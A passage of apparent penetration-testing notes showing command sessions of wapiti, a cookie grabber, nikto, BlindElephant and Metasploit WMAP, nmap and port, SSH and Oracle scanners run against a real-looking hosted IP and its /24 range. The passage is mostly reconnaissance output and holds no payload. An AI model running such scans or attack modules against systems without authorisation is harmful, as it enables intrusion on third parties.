++ attackGET http://www.target!.com/leather-crafting.html
++ attackGET http://www.target!.com/wooden-items.html
++ attackGET http://www.target!.com/random-items.html
++ attackGET http://www.target!.com/WSB.ForceDesktop
++ attackGET http://www.target!.com/common/cookiemanager/cookiemanager
++ attackGET http://www.target!.com/designer/iebackground/iebackground
++ attackGET http://www.target!.com/.view-as-mobile
++ attackGET http://www.target!.com/.wsb-canvas-page-container
++ attackGET http://www.target!.com/target!.com
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/customform/customForm.published
++ attackGET http://www.target!.com/designer/app/builder/ui/controls/media/gallery/media.gallery
++ attackGET http://www.target!.com/Loading...
++ attackGET http://www.target!.com/designer/social/twitter/social.twitter
++ attackGET http://www.target!.com/plugins/twitter/index.php
++ attackGET http://www.target!.com/designer/util/facebookSDKHelper
+
+[+] Launching module permanentxss
++ http://www.target!.com/
++ http://www.target!.com/site.css?v=
++ http://www.target!.com/common/wsb/core
++ http://www.target!.com/libs/knockout/knockout
++ http://www.target!.com/home.html
++ http://www.target!.com/contact.html
++ http://www.target!.com/designer/app/builder/ui/canvas/elements/navigation/subNavigation
++ http://www.target!.com/products.html
++ http://www.target!.com/bullet-jewellery.html
++ http://www.target!.com/boar-tusk-necklaces.html
++ http://www.target!.com/decorated-skulls-.html
++ http://www.target!.com/bone-art.html
++ http://www.target!.com/leather-crafting.html
++ http://www.target!.com/wooden-items.html
++ http://www.target!.com/random-items.html
++ http://www.target!.com/WSB.ForceDesktop
++ http://www.target!.com/common/cookiemanager/cookiemanager
++ http://www.target!.com/designer/iebackground/iebackground
++ http://www.target!.com/.view-as-mobile
++ http://www.target!.com/.wsb-canvas-page-container
++ http://www.target!.com/target!.com
++ http://www.target!.com/designer/app/builder/ui/canvas/elements/customform/customForm.published
++ http://www.target!.com/designer/app/builder/ui/controls/media/gallery/media.gallery
++ http://www.target!.com/Loading...
++ http://www.target!.com/designer/social/twitter/social.twitter
++ http://www.target!.com/plugins/twitter/index.php
++ http://www.target!.com/designer/util/facebookSDKHelper
+
+Report
+------
+A report has been generated in the file /tmp/scan_report
+Open /tmp/scan_report/index.html with a browser to see this report.
+
+┌─[root@parrot]─[~]
+└──╼ #firefox /tmp/scan_report/index.html
+
+
+...........................
+Note
+========
+This scan has been saved in the file /root/.wapiti/scans/www.target!.com.xml
+You can use it to perform attacks without scanning again the web site with the "-k" parameter
+
+
+NOTE
+
+wapiti works better when you use the cookie value.
+
+To get the cookie use the getcookie.py script
+
+Use getcookie.py.
+
+Usage: python getcookie.py <cookie_file> <url_with_form>
+
+It will dump the cookie to the file. After getting the cookie set Powerfuzzer to use it (Cookie button in the GUI)
+
+Cookies are save in LWP format. (LWPCookieJar)
+
+#LWP-Cookies-2.0
+Set-Cookie3: SID=a0b498e88f488dd8a48baf6778da85b9; path="/"; domain="test.com"; path_spec; discard; version=0
+
+
+┌─[✗]─[root@parrot]─[/usr/share/powerfuzzer]
+└──╼ #./getcookie.py ~/cookie.txt http://www.target!.com/webapp/login.php
+
+Enter username/password etc as required to complete the login form
+
+Script exists, check the contents of ~/cookie.txt – it will look something like :
+
+#LWP-Cookies-2.0
+
+Set-Cookie3: PHPSESSID=3d20841af5de43c718732d80e5d78fe3; path=”/”; domain=”orange”; path_spec; expires=”2010-01-04 22:42:47Z”; version=0
+
+Now we can use wapiti to test any urls ‘behind’ the login screen (as it were) :
+
+wapiti http://www.target!.com/webapp/search.php –cookie ~/cookie.txt -v 2 -o ~/report -x http://www.target!.com/webapp/logout.php
+
+(We need to exclude the logout page, else our session will get destroyed when wapiti spiders that page…)
+
+
+USE BLINDELEPHANT
+
+https://media.blackhat.com/bh-us-10/presentations/Thomas/BlackHat-USA-2010-Thomas-BlindElephant-WebApp-Fingerprinting-slides.pdf
+
+BlindElephant.py http://www.somesite.com appName
+
+BlindElephant.py http://forum.somesite.com phpbb
+
+┌─[root@parrot]─[~]
+└──╼ #BlindElephant.py www.target!.com movabletype
+Loaded /usr/lib/pymodules/python2.7/blindelephant/dbs/movabletype.pkl with 101 versions, 2229 differentiating paths, and 216 version groups.
+Starting BlindElephant fingerprint for version of movabletype at http://www.target!.com 
+
+Hit http://www.target!.com/mt-static/mt.js
+File produced no match. Error: Failed to reach a server: timed out 
+
+Hit http://www.target!.com/mt-static/js/tc/client.js
+File produced no match. Error: Failed to reach a server: timed out 
+
+
+Error: All versions ruled out!
+
+
+
+CHECK THE SITE WITH NIKTO
+
+┌─[root@parrot]─[~]
+└──╼ #nikto -h 198.71.232.3
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ No web server found on 198.71.232.3:80
+---------------------------------------------------------------------------
++ 0 host(s) tested
+
+┌─[root@parrot]─[~]
+└──╼ #nikto -h 198.71.232.3 -p 443
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          198.71.232.3
++ Target Hostname:    198.71.232.3
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /C=US/ST=Arizona/L=Scottsdale/O=GoDaddy.com, LLC/CN=*.godaddysites.com
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /C=US/ST=Arizona/L=Scottsdale/O=GoDaddy.com, Inc./OU=http://certificates.godaddy.com/repository/CN=Go Daddy Secure Certification Authority/serialNumber=07969287
++ Start Time:         2016-05-29 17:25:53 (GMT2)
+---------------------------------------------------------------------------
++ Server: DPS/1.0.3
++ Cookie dps_site_id created without the secure flag
++ Cookie dps_site_id created without the httponly flag
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'x-siteid' found, with contents: 2000
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server is using a wildcard certificate: *.godaddysites.com
++ Hostname '198.71.232.3' does not match certificate's names: *.godaddysites.com
++ ERROR: Error limit (20) reached for host, giving up. Last error: 
++ Scan terminated:  18 error(s) and 9 item(s) reported on remote host
++ End Time:           2016-05-29 18:04:21 (GMT2) (2308 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+USE METASPLOIT
+
+ ____                      _   ____       
+|  _ \ __ _ _ __ _ __ ___ | |_/ ___|  ___  ___ 
+| |_) / _` | '__| '__/ _ \| __\___ \ / _ \/ __|
+|  __/ (_| | |  | | | (_) | |_ ___) |  __/ (__ 
+|_|   \__,_|_|  |_|  \___/ \__|____/ \___|\___|
+                                               
+
+executing "msfstart"
+
+Creating database user 'msf'
+Enter password for new role: 
+Enter it again: 
+Creating databases 'msf' and 'msf_test'
+Creating configuration file in /usr/share/metasploit-framework/config/database.yml
+Creating initial database schema
+┌─[root@parrot]─[~]
+└──╼ #msfconsole
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+
+ http://metasploit.pro
+
+
+Easy phishing: Set up email templates, landing pages and listeners
+in Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2016010401                   ]
++ -- --=[ 1517 exploits - 875 auxiliary - 257 post        ]
++ -- --=[ 437 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > 
+
+
+CONNECT TO THE POSTGRES DB
+
+msf > db_connect root:toor
+[-] postgresql already connected to msf
+[-] Run db_disconnect first if you wish to connect to a different database
+msf > 
+
+
+CHECK DB STATUS
+
+msf > db_status
+[*] postgresql connected to msf
+
+
+USE WMAP
+
+msf > load wmap
+
+.-.-.-..-.-.-..---..---.
+| | | || | | || | || |-'
+`-----'`-'-'-'`-^-'`-'
+[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
+[*] Successfully loaded plugin: wmap
+msf > 
+
+ADD THE SITE
+
+msf > wmap_sites -a http://www.target!.com 
+
+msf > wmap_sites -l
+
+ADD THE TARGET
+
+msf > wmap_targets -t http://198.71.232.3
+msf > wmap_targets -l
+[*] Defined targets
+===============
+
+     Id  Vhost         Host          Port  SSL    Path
+     --  -----         ----          ----  ---    ----
+     0   198.71.232.3  198.71.232.3  80    false  	/
+
+
+RUN THE TEST
+
+msf > wmap_run -t
+[*] Testing target:
+[*] 	Site: 198.71.232.3 (198.71.232.3)
+[*] 	Port: 80 SSL: false
+============================================================
+[*] Testing started. 2016-05-29 13:37:42 +0200
+[*] Loading wmap modules...
+[*] 40 wmap enabled modules loaded.
+[*] 
+=[ SSL testing ]=
+============================================================
+[*] Target is not SSL. SSL modules disabled.
+[*] 
+=[ Web Server testing ]=
+============================================================
+[*] Module auxiliary/scanner/http/http_version
+[*] Module auxiliary/scanner/http/open_proxy
+[*] Module auxiliary/scanner/http/robots_txt
+[*] Module auxiliary/scanner/http/frontpage_login
+[*] Module auxiliary/scanner/http/host_header_injection
+[*] Module auxiliary/admin/http/tomcat_administration
+[*] Module auxiliary/admin/http/tomcat_utf8_traversal
+[*] Module auxiliary/scanner/http/options
+[*] Module auxiliary/scanner/http/drupal_views_user_enum
+[*] Module auxiliary/scanner/http/scraper
+[*] Module auxiliary/scanner/http/svn_scanner
+[*] Module auxiliary/scanner/http/trace
+[*] Module auxiliary/scanner/http/vhost_scanner
+[*] Module auxiliary/scanner/http/webdav_internal_ip
+[*] Module auxiliary/scanner/http/webdav_scanner
+[*] Module auxiliary/scanner/http/webdav_website_content
+[*] 
+=[ File/Dir testing ]=
+============================================================
+[*] Module auxiliary/dos/http/apache_range_dos
+[*] Module auxiliary/scanner/http/backup_file
+[*] Module auxiliary/scanner/http/brute_dirs
+[*] Module auxiliary/scanner/http/copy_of_file
+[*] Module auxiliary/scanner/http/dir_listing
+[*] Module auxiliary/scanner/http/dir_scanner
+[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
+[*] Module auxiliary/scanner/http/file_same_name_dir
+[*] Module auxiliary/scanner/http/files_dir
+[*] Module auxiliary/scanner/http/http_put
+[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
+[*] Module auxiliary/scanner/http/prev_dir_same_name_file
+[*] Module auxiliary/scanner/http/replace_ext
+[*] Module auxiliary/scanner/http/soap_xml
+[*] Module auxiliary/scanner/http/trace_axd
+[*] Module auxiliary/scanner/http/verb_auth_bypass
+[*] 
+=[ Unique Query testing ]=
+============================================================
+[*] Module auxiliary/scanner/http/blind_sql_query
+[*] Module auxiliary/scanner/http/error_sql_injection
+[*] Module auxiliary/scanner/http/http_traversal
+[*] Module auxiliary/scanner/http/rails_mass_assignment
+[*] Module exploit/multi/http/lcms_php_exec
+[*] 
+=[ Query testing ]=
+============================================================
+[*] 
+=[ General testing ]=
+============================================================
+[*] Done.
+
+All that remains now is to actually run the WMAP scan against our target URL.
+
+RUN THE EXPLOIT
+
+msf > wmap_run -e
+[*] Using ALL wmap enabled modules.
+[-] NO WMAP NODES DEFINED. Executing local modules
+[*] Testing target:
+[*] 	Site: 198.71.232.3 (198.71.232.3)
+[*] 	Port: 80 SSL: false
+============================================================
+[*] Testing started. 2016-05-29 13:38:10 +0200
+[*] 
+=[ SSL testing ]=
+============================================================
+[*] Target is not SSL. SSL modules disabled.
+[*] 
+=[ Web Server testing ]=
+============================================================
+[*] Module auxiliary/scanner/http/http_version
+
+[*] 198.71.232.3:80 DPS/1.0.3
+[*] Module auxiliary/scanner/http/open_proxy
+[*] Module auxiliary/scanner/http/robots_txt
+[*] Module auxiliary/scanner/http/frontpage_login
+[*] http://198.71.232.3/ may not support FrontPage Server Extensions
+[*] Module auxiliary/scanner/http/host_header_injection
+[*] Module auxiliary/admin/http/tomcat_administration
+[*] Module auxiliary/admin/http/tomcat_utf8_traversal
+[*] Attempting to connect to 198.71.232.3:80
+[+] No File(s) found
+[*] Module auxiliary/scanner/http/options
+[*] Module auxiliary/scanner/http/drupal_views_user_enum
+[-] 198.71.232.3 does not appear to be vulnerable, will not continue
+[*] Module auxiliary/scanner/http/scraper
+[*] [198.71.232.3] / [404 Not Found]
+[*] Module auxiliary/scanner/http/svn_scanner
+[*] Using code '404' as not found.
+[*] Module auxiliary/scanner/http/trace
+[*] Module auxiliary/scanner/http/vhost_scanner
+[*]  >> Exception during launch from auxiliary/scanner/http/vhost_scanner: The following options failed to validate: DOMAIN.
+[*] Module auxiliary/scanner/http/webdav_internal_ip
+[*] Module auxiliary/scanner/http/webdav_scanner
+[*] Module auxiliary/scanner/http/webdav_website_content
+[*] 
+=[ File/Dir testing ]=
+============================================================
+[*] Module auxiliary/dos/http/apache_range_dos
+[*] Module auxiliary/scanner/http/backup_file
+[*] Module auxiliary/scanner/http/brute_dirs
+[*] Path: /
+[*] Using code '404' as not found.
+[*] Module auxiliary/scanner/http/copy_of_file
+[*] Module auxiliary/scanner/http/dir_listing
+[*] Path: /
+[*] Module auxiliary/scanner/http/dir_scanner
+[*] Path: /
+[*] Detecting error code
+[*] Using code '404' as not found for 198.71.232.3
+[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
+[*] Path: /
+[*] Using code '404' as not found.
+[*] Module auxiliary/scanner/http/file_same_name_dir
+[*] Path: /
+[-] Blank or default PATH set.
+[*] Module auxiliary/scanner/http/files_dir
+[*] Path: /
+[*] Using code '404' as not found for files with extension .null
+[*] Module auxiliary/scanner/http/http_put
+[*] Path: /
+[-] File doesn't seem to exist. The upload probably failed.
+[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
+[*] Path: /
+[-] 198.71.232.3:80 Folder does not require authentication. [404]
+[*] Module auxiliary/scanner/http/prev_dir_same_name_file
+[*] Path: /
+[-] Blank or default PATH set.
+[*] Module auxiliary/scanner/http/replace_ext
+[*] Module auxiliary/scanner/http/soap_xml
+[*] Path: /
+[*] Starting scan with 0ms delay between requests
+[-] The connection timed out (198.71.232.3:80).
+[-] The connection timed out (198.71.232.3:80).
+[*] Module auxiliary/scanner/http/trace_axd
+[*] Path: /
+[*] Module auxiliary/scanner/http/verb_auth_bypass
+[*] 
+=[ Unique Query testing ]=
+============================================================
+[*] Module auxiliary/scanner/http/blind_sql_query
+[*] Module auxiliary/scanner/http/error_sql_injection
+[*] Module auxiliary/scanner/http/http_traversal
+[*] Module auxiliary/scanner/http/rails_mass_assignment
+[*] Module exploit/multi/http/lcms_php_exec
+[*] 
+=[ Query testing ]=
+============================================================
+[*] 
+=[ General testing ]=
+============================================================
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Launch completed in 8302.240582227707 seconds.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[*] Done.
+
+Once the scan has finished executing, we take a look at the database to see if WMAP found anything of interest.
+
+
+CHECK THE VULNERABILITIES
+
+msf > wmap_vulns -l
+[*] + [198.71.232.3] (198.71.232.3): scraper /
+[*] 	scraper Scraper
+[*] 	GET 404 Not Found
+
+
+EXECUTE VULNERABILITIES
+
+msf > vulns
+
+
+RUN DB_NMAP
+
+msf > db_nmap 198.71.232.3 -PN
+[*] Nmap: Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-29 17:31 CEST
+[*] Nmap: 'mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers'
+[*] Nmap: Nmap scan report for 198.71.232.3
+[*] Nmap: Host is up (0.11s latency).
+[*] Nmap: Not shown: 998 filtered ports
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 80/tcp  open  http
+[*] Nmap: 443/tcp open  https
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
+
+EXPORT NMAP RESULTS
+
+msf > db_export -f xml /root/Desktop/Exported.xml
+[*] Starting export of workspace default to /root/Desktop/Exported.xml [ xml ]...
+[*]     >> Starting export of report
+[*]     >> Starting export of hosts
+[*]     >> Starting export of events
+[*]     >> Starting export of services
+[*]     >> Starting export of web sites
+[*]     >> Starting export of web pages
+[*]     >> Starting export of web forms
+[*]     >> Starting export of web vulns
+[*]     >> Starting export of module details
+[*]     >> Finished export of report
+[*] Finished export of workspace default to /root/Desktop/Exported.xml [ xml ]...
+
+
+IMPORT NMAP RESULTS
+
+msf >  db_import /root/Desktop/Exported.xml
+
+msf > db_import /root/Desktop/Exported.xml
+[*] Importing 'Metasploit XML' data
+[*] Importing host 198.71.232.0
+[*] Importing host 198.71.232.1
+[*] Importing host 198.71.232.2
+[*] Importing host 198.71.232.3
+[*] Importing host 198.71.232.4
+[*] Importing host 198.71.232.5
+[*] Importing host 198.71.232.6
+[*] Importing host 198.71.232.7
+[*] Importing host 198.71.232.9
+[*] Successfully imported /root/Desktop/Exported.xml
+
+
+
+msf > hosts
+
+Hosts
+=====
+
+address       mac  name          os_name  os_flavor  os_sp  purpose  info  comments
+-------       ---  ----          -------  ---------  -----  -------  ----  --------
+198.71.232.0                     Unknown                    device         
+198.71.232.1                     Unknown                    device         
+198.71.232.2                     Unknown                    device         
+198.71.232.3       198.71.232.3  Unknown                    device         
+198.71.232.4                     Unknown                    device         
+198.71.232.5                     Unknown                    device         
+198.71.232.6                     Unknown                    device         
+198.71.232.7                     Unknown                    device         
+198.71.232.9                     Unknown                    device         
+
+
+
+msf > hosts -c address,os_flavor
+
+Hosts
+=====
+
+address       os_flavor
+-------       ---------
+198.71.232.0  
+198.71.232.1  
+198.71.232.2  
+198.71.232.3  
+198.71.232.4  
+198.71.232.5  
+198.71.232.6  
+198.71.232.7  
+198.71.232.9  
+
+
+
+msf > hosts -c address,os_flavor -S Linux
+
+msf auxiliary(tcp) > show options
+
+msf auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R
+
+RHOSTS => 198.71.232.3
+
+msf  auxiliary(tcp) > run
+
+msf  auxiliary(tcp) > hosts -R
+
+RHOSTS => 198.71.232.3
+
+msf  auxiliary(tcp) > show options
+
+msf > services -c name,info 198.71.232.3
+
+Services
+========
+
+host          name   info
+----          ----   ----
+198.71.232.3  http   DPS/1.0.3
+198.71.232.3  https  
+
+
+msf > services -c name,info -S http
+
+Services
+========
+
+host          name   info
+----          ----   ----
+198.71.232.3  http   DPS/1.0.3
+198.71.232.3  https  
+198.71.232.4  https  
+198.71.232.4  http   
+198.71.232.5  https  
+198.71.232.6  http   
+198.71.232.6  https  
+198.71.232.7  http   
+198.71.232.7  https  
+198.71.232.9  http   
+
+msf > services -c name,info -S https
+
+Services
+========
+
+host          name   info
+----          ----   ----
+198.71.232.3  https  
+198.71.232.4  https  
+198.71.232.5  https  
+198.71.232.6  https  
+198.71.232.7  https  
+
+
+msf > services -c info,name -p 443
+
+Services
+========
+
+host          info  name
+----          ----  ----
+198.71.232.3        https
+198.71.232.4        https
+198.71.232.5        https
+198.71.232.6        https
+198.71.232.7        https
+
+
+msf > services -c port,proto,state -p 70-81
+
+msf > services -c port,proto,state -p 70-81
+
+Services
+========
+
+host          port  proto  state
+----          ----  -----  -----
+198.71.232.3  80    tcp    open
+198.71.232.4  80    tcp    open
+198.71.232.6  80    tcp    open
+198.71.232.7  80    tcp    open
+198.71.232.9  80    tcp    open
+
+msf > services -c port,proto,state -p 70-81-3306
+
+Services
+========
+
+host          port  proto  state
+----          ----  -----  -----
+198.71.232.3  80    tcp    open
+198.71.232.4  80    tcp    open
+198.71.232.6  80    tcp    open
+198.71.232.7  80    tcp    open
+198.71.232.9  80    tcp    open
+
+
+msf > services -c port,proto,state -p 21-22-25-70-80-81-443-3306
+
+Services
+========
+
+host          port  proto  state
+----          ----  -----  -----
+198.71.232.7  22    tcp    open
+
+
+msf > services -s http -c port 198.71.232.3
+
+Services
+========
+
+host          port
+----          ----
+198.71.232.3  80
+
+msf > services -s https -c port 198.71.232.3
+
+Services
+========
+
+host          port
+----          ----
+198.71.232.3  443
+
+
+msf > services -S Unr
+
+Services
+========
+
+host  port  proto  name  state  info
+----  ----  -----  ----  -----  ----
+
+
+CSV Export
+
+msf > services -s http -c port 198.71.232.3 -o /root/Desktop/http.csv
+
+[*] Wrote services to /root/Desktop/http.csv
+
+msf > services -s https -c port 198.71.232.3 -o /root/Desktop/https.csv
+
+[*] Wrote services to /root/Desktop/https.csv
+
+msf > hosts -S Linux -o /root/Desktop/linux.csv
+[*] Wrote hosts to /root/Desktop/linux.csv
+
+msf > cat /root/Desktop/http.csv
+[*] exec: cat /root/Desktop/http.csv
+
+host,port
+"198.71.232.3","80"
+
+msf > cat /root/Desktop/https.csv
+[*] exec: cat /root/Desktop/https.csv
+
+host,port
+"198.71.232.3","443"
+
+msf > cat /root/Desktop/linux.csv
+[*] exec: cat /root/Desktop/linux.csv
+
+address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments
+
+RELOAD ALL METASPLOIT MODULES
+
+msf > reload_all
+[*] Reloading modules from all module paths...
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V4                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 4 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           http://metasploit.pro
+
+
+Easy phishing: Set up email templates, landing pages and listeners
+in Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2016010401                   ]
++ -- --=[ 1517 exploits - 875 auxiliary - 257 post        ]
++ -- --=[ 437 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+
+USE ARP_SWEEP
+
+msf > use auxiliary/scanner/discovery/arp_sweep
+msf auxiliary(arp_sweep) > show options
+
+Module options (auxiliary/scanner/discovery/arp_sweep):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   INTERFACE                   no        The name of the interface
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SHOST                       no        Source IP Address
+   SMAC                        no        Source MAC Address
+   THREADS    1                yes       The number of concurrent threads
+   TIMEOUT    5                yes       The number of seconds to wait for new data
+
+msf auxiliary(arp_sweep) > set RHOSTS 198.71.232.3/24
+RHOSTS => 198.71.232.3/24
+msf auxiliary(arp_sweep) > set THREADS 50
+THREADS => 50
+msf auxiliary(arp_sweep) > run
+
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+msf auxiliary(arp_sweep) > back
+
+USE NMAP
+
+msf > nmap -sn 198.71.232.3/24
+[*] exec: nmap -sn 198.71.232.3/24
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-29 18:31 CEST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 198.71.232.0
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.1
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.2
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.3
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.4
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.5
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.6
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.7
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.8
+Host is up (0.11s latency).
+Nmap scan report for 198.71.232.9
+Host is up (0.11s latency).
+Nmap done: 256 IP addresses (10 hosts up) scanned in 5.25 seconds
+
+
+msf > nmap -PU -sn 198.71.232.3/24
+[*] exec: nmap -PU -sn 198.71.232.3/24
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-29 18:33 CEST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap done: 256 IP addresses (0 hosts up) scanned in 52.11 seconds
+
+
+msf > nmap -O 198.71.232.3
+[*] exec: nmap -O 198.71.232.3
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-29 18:34 CEST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 198.71.232.3
+Host is up (0.11s latency).
+Not shown: 998 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds
+
+
+SEARCH PORTSCAN
+
+msf > search portscan
+
+Matching Modules
+================
+
+   Name                                              Disclosure Date  Rank    Description
+   ----                                              ---------------  ----    -----------
+   auxiliary/scanner/http/wordpress_pingback_access                   normal  Wordpress Pingback Locator
+   auxiliary/scanner/natpmp/natpmp_portscan                           normal  NAT-PMP External Port Scanner
+   auxiliary/scanner/portscan/ack                                     normal  TCP ACK Firewall Scanner
+   auxiliary/scanner/portscan/ftpbounce                               normal  FTP Bounce Port Scanner
+   auxiliary/scanner/portscan/syn                                     normal  TCP SYN Port Scanner
+   auxiliary/scanner/portscan/tcp                                     normal  TCP Port Scanner
+   auxiliary/scanner/portscan/xmas                                    normal  TCP "XMas" Port Scanner
+   auxiliary/scanner/sap/sap_router_portscanner                       normal  SAPRouter Port Scanner
+
+USE PORTSCAN
+
+msf > use auxiliary/scanner/portscan/syn
+
+msf auxiliary(syn) > set RHOSTS 198.71.232.3
+
+RHOSTS => 198.71.232.3
+
+msf auxiliary(syn) >  set THREADS 200
+
+THREADS => 200
+
+msf auxiliary(syn) > run
+
+[*]  TCP OPEN 198.71.232.3:80
+[*]  TCP OPEN 198.71.232.3:443
+
+SEARCH NAME_VERSION
+
+msf > search name:_version
+
+USE TELNET AUXILIARY SCANNER
+
+msf > use auxiliary/scanner/telnet/telnet_version
+msf auxiliary(telnet_version) > set RHOSTS 198.71.232.3/24
+RHOSTS => 198.71.232.3
+msf auxiliary(telnet_version) > set THREADS 100
+THREADS => 100
+msf auxiliary(telnet_version) > run
+
+[*] Scanned  41 of 256 hosts (16% complete)
+[*] Scanned  93 of 256 hosts (36% complete)
+[*] Scanned  96 of 256 hosts (37% complete)
+[*] Scanned 130 of 256 hosts (50% complete)
+[*] Scanned 131 of 256 hosts (51% complete)
+[*] Scanned 192 of 256 hosts (75% complete)
+[*] Scanned 193 of 256 hosts (75% complete)
+[*] Scanned 211 of 256 hosts (82% complete)
+[*] Scanned 241 of 256 hosts (94% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(telnet_version) > 
+
+
+USE AUXILIARY SSH_VERSION
+
+msf auxiliary(telnet_version) > use auxiliary/scanner/ssh/ssh_version
+msf auxiliary(ssh_version) > show options
+
+Module options (auxiliary/scanner/ssh/ssh_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    22               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+   TIMEOUT  30               yes       Timeout for the SSH probe
+
+msf auxiliary(ssh_version) > set RHOSTS 198.71.232.3/24
+RHOSTS => 198.71.232.3/24
+msf auxiliary(ssh_version) > set THREADS 200
+THREADS => 200
+msf auxiliary(ssh_version) > run
+
+[*] 198.71.232.7:22 SSH server version: SSH-2.0-OpenSSH_6.3 ( service.version=6.3 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH )
+[*] Scanned  42 of 256 hosts (16% complete)
+[*] Scanned  77 of 256 hosts (30% complete)
+[*] Scanned 119 of 256 hosts (46% complete)
+[*] Scanned 136 of 256 hosts (53% complete)
+[*] Scanned 137 of 256 hosts (53% complete)
+[*] Scanned 156 of 256 hosts (60% complete)
+[*] Scanned 187 of 256 hosts (73% complete)
+[*] Scanned 253 of 256 hosts (98% complete)
+[*] Scanned 255 of 256 hosts (99% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+USE ORACLE SCANNER
+
+msf auxiliary(tnslsnr_version) > show options
+
+Module options (auxiliary/scanner/oracle/tnslsnr_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    1521             yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+msf auxiliary(tnslsnr_version) > set RHOSTS 198.71.232.3/24
+RHOSTS => 198.71.232.3/24
+msf auxiliary(tnslsnr_version) > set THREADS 200
+THREADS => 200
+msf auxiliary(tnslsnr_version) > run
+
+[*] Scanned 105 of 256 hosts (41% complete)
+[*] Scanned 113 of 256 hosts (44% complete)
+[*] Scanned 131 of 256 hosts (51% complete)
+[*] Scanned 188 of 256 hosts (73% complete)
+[*] Scanned 200 of 256 hosts (78% complete)
+[*] Scanned 237 of 256 hosts (92% complete)
